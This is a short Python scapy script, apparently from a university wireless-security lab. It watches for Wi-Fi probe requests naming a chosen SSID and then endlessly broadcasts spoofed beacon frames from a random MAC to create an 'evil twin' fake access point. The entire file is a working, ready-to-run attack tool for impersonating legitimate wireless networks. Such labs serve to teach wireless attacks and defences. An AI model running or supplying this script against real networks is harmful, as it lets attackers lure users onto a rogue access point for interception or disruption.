# Source:
#
# Author: Victor Truan, Jerome Bagnoud | SWI - Labo 02

import argparse
from scapy.all import *

BROADCAST_MAC_ADDRESS = "FF:FF:FF:FF:FF:FF"

# Arguments
parser = argparse.ArgumentParser(description="")
parser.add_argument("-i", "--interface", required=True, help="l'interface a utilise")
parser.add_argument("--ssid", required=True, type=str, help="le SSID a recherche")

arguments = parser.parse_args()

def handlePacket(packet):
    if(packet.type == 0 and packet.subtype == 4):
        if(packet.info.decode() == arguments.ssid):
            spawnEvilTwin()

def spawnEvilTwin():
    print("Le SSID passe en parametre a ete detecte, creation du faux AP en cours...")
    fakeAPMAC = RandMAC()
    evilTwinPacket = RadioTap() / Dot11(type=0, subtype=8, addr1=BROADCAST_MAC_ADDRESS,addr2=fakeAPMAC, addr3=fakeAPMAC) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=arguments.ssid)

    while True:
        sendp(evilTwinPacket, iface=arguments.interface, verbose=False)

# Begin to sniff, passing every packet collected to the packetHandling function
a = sniff(iface=arguments.interface, prn=handlePacket)